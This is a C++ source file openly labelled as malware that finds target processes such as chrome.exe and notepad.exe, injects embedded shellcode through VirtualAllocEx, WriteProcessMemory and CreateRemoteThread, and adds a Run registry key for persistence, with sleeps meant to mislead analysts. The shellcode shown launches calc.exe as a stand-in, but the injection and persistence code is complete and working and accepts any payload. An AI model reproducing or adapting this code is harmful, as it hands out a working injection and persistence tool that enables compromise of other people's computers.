
/*

Project: R3dJ0hn | Red John.

A malware that
1) Finds all running processes,
2) Scans the list for specific process mentioned by threat actor and on match, stores them separately,
3) Starts opening handles for all the matches and stops when successfully gets a handle,
4) Injects custom shellcode to the process,
5) Adds a registry key for startup, achieving persistence.
6) Sleep induced in between operations to confuse Security Analyst of a long timeline.

*/


#include <windows.h>
#include <iostream>
#include <memoryapi.h>
#include <processthreadsapi.h>
#include <winbase.h>
#include <string>
#include "atlstr.h"
#include <tlhelp32.h>
#include <tchar.h>
#include <winreg.h>

using namespace std;


//  Forward declarations:
int GetProcessList();
BOOL Persistence();

BOOL Persistence()
{
    HKEY hOpened;
    char pPath[100];

    GetModuleFileNameA(0, pPath, 100);

    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_ALL_ACCESS, &hOpened);
    Sleep(5000);

    if (RegSetValueExA(hOpened, (LPCSTR)"R3dJ0hn", 0, REG_SZ, (LPBYTE)pPath, sizeof(pPath)) != ERROR_SUCCESS)
    {
        cout << "Error Setting Key Value!!! " << endl;
        return FALSE;
    }
    else
    {
        cout << endl << "Key value Set. Persistance Achieved!!! " << endl;
        return TRUE;
    }

    RegCloseKey(hOpened);
    return true;
}

DWORD PIDs[500];  // Global declarion of PID Array so that it can be used From MAIN or GetProcessList() //
int GetProcessList()
{
    HANDLE hProcessSnap;
    PROCESSENTRY32 pe32;

    wstring names[20] = { L"calculator.exe", L"chrome.exe", L"notepad.exe", L"msedge.exe", L"conhost.exe" };
    int counter = 0;
    int i = 0;


    // Take a snapshot of all processes in the system.
    hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Sleep(5000);
    if (hProcessSnap == INVALID_HANDLE_VALUE)
    {
        printf("Error taking snaphot of all processes!!! \n");
        cout << GetLastError() << endl;
        return(FALSE);
    }

    // Set the size of the structure before using it.
    pe32.dwSize = sizeof(PROCESSENTRY32);
    pe32.th32ProcessID = sizeof(DWORD);

    if (!Process32First(hProcessSnap, &pe32))
    {
        printf("Error copying process information to buffer!!! \n");
        cout << GetLastError() << endl;
        CloseHandle(hProcessSnap);
        return(FALSE);
    }
    else
    {
        cout << "Process Information successfully copied to buffer!!!" << endl;
    }

    // display information about each process in turn


    int temp_count = 0;
    while (Process32Next(hProcessSnap, &pe32))
    {
        counter++;
        //cout << "Counter Var: " << counter << endl;

        for (i = 0; i <= 4; i++)
        {

            if (wcscmp(pe32.szExeFile, names[i].c_str()) == 0)
            {

                cout << "--------------------------------------------------------" << endl;
                wcout << "scanning -> " << names[i].c_str() << " with -> " << pe32.szExeFile << endl;
                wcout << "Matched -> " << pe32.szExeFile << endl;
                cout << "Process ID -> " << pe32.th32ProcessID << endl;
                cout << "--------------------------------------------------------" << endl;
                PIDs[temp_count] = pe32.th32ProcessID;
                temp_count += 1;
            }
            else
            {
                wcout << "scanning -> " << names[i].c_str() << " with -> " << pe32.szExeFile << endl;
                wcout << "Not Matched -> " << pe32.szExeFile << endl;
            }
        }
    }

    //for (i = 0; i < temp_count; i++)
    //{
    //    cout << "Process IDs of Matched Apps -> " << PIDs[i] << endl;
    //}

    CloseHandle(hProcessSnap);
    return(temp_count);
}



int APIENTRY _tWinMain(HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPTSTR    lpCmdLine,
    int       nCmdShow)



//int main() // Only to debug. Change linker target to Console if needed to use int main //

{


    unsigned char shcode[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52"
        "\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48"
        "\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9"
        "\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41"
        "\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48"
        "\x01\xd0\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01"
        "\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48"
        "\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0"
        "\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c"
        "\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0"
        "\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04"
        "\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59"
        "\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
        "\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
        "\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b\x6f"
        "\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff"
        "\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
        "\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64"
        "\x2e\x65\x78\x65\x20\x2f\x63\x20\x63\x61\x6c\x63\x2e\x65\x78"
        "\x65\x00";



    // END OF SHELL CODE //

    LPCWSTR arg = lpCmdLine;

    int len = lstrlen(arg);

        if (len < 1)
        {
            MessageBoxA(NULL, "Tiger Tiger burning bright!!! ", "L0L", MB_OK | MB_ICONQUESTION);
        }

        else
        {
            //wcscat_s(cert, arg);
            MessageBoxW(NULL, L"L0L Seriously? ", L"Seriously?", MB_OK | MB_ICONQUESTION); // OPTIONAL //
        }
    


    int number_of_IDs = GetProcessList();

    DWORD PID;
    HANDLE ProcHnd;
    PVOID64 buffer;
    HANDLE thread;

    int i = 0;

    printf("\n ");
    cout << "Going for Injection!!! " << endl;
    printf("\n ");

    for (i = 0; i < number_of_IDs; i++)
    {
        cout << "Trying with Process ID -> " << PIDs[i] << endl;

        PID = (DWORD)PIDs[i];

        if (ProcHnd = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(PID)))
        {
            Sleep(5000);
            cout << "Successfully Opened Process! " << ProcHnd << endl;
            printf("\n");
            cout << "Process ID of Opened App ->  " << PID << endl;
            printf("\n");
            cout << "Going into Memory Injection!!! " << endl;
            printf("\n");
            CloseHandle(ProcHnd);
            break;
        }
        else
        {
            Sleep(5000);
            printf("Failed to open a process for PID %d \n", PID);
            printf("\n");
            printf("Trying with next available process ID!!! \n ");
            printf("\n");
            continue;
        }

    }

    Sleep(5000);
    if (ProcHnd = OpenProcess(PROCESS_ALL_ACCESS, FALSE, DWORD(PID)))
    {
        cout << "Successfully opened process!!! " << endl;
    }
    else
    {
        cout << "Error Opening Process!!! " << endl;
        cout << GetLastError() << endl;
    }

    Sleep(5000);
    buffer = VirtualAllocEx(ProcHnd, NULL, sizeof(shcode) + 1024, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);

    if (!buffer)
    {
        printf("Failed to allocate Memory! \n");
        cout << GetLastError() << endl;
    }
    else
    {
        printf("Memory Allocated. Base Address: %p ", buffer);
        printf("\n");
    }

    Sleep(5000);
    int write = WriteProcessMemory(ProcHnd, (LPVOID)buffer, (LPVOID)shcode, sizeof(shcode), NULL);

    if (write == 0)
    {
        printf("Error Writing to process memory! \n");
        cout << GetLastError() << endl;
    }
    else
    {
        printf("Writing to Process Memory successful!!! \n");
        cout << "Return Value: " << write << endl;
    }

    Sleep(5000);

    if (thread = CreateRemoteThread(ProcHnd, NULL, 0, (LPTHREAD_START_ROUTINE)buffer, NULL, 0, NULL))
    {
        printf("Remote thread started! \n ");
        cout << "Return Value: " << thread << endl;
    }
    else
    {
        printf("Failed to start remote thread!\n");
        cout << GetLastError() << endl;
    }

    Persistence();


    //WaitForSingleObject(thread, INFINITE);
    CloseHandle(ProcHnd);

    //system("pause"); // For console mode -> OPTIONAL

    return 0;
    //exit(1); // For console mode -> OPTIONAL

}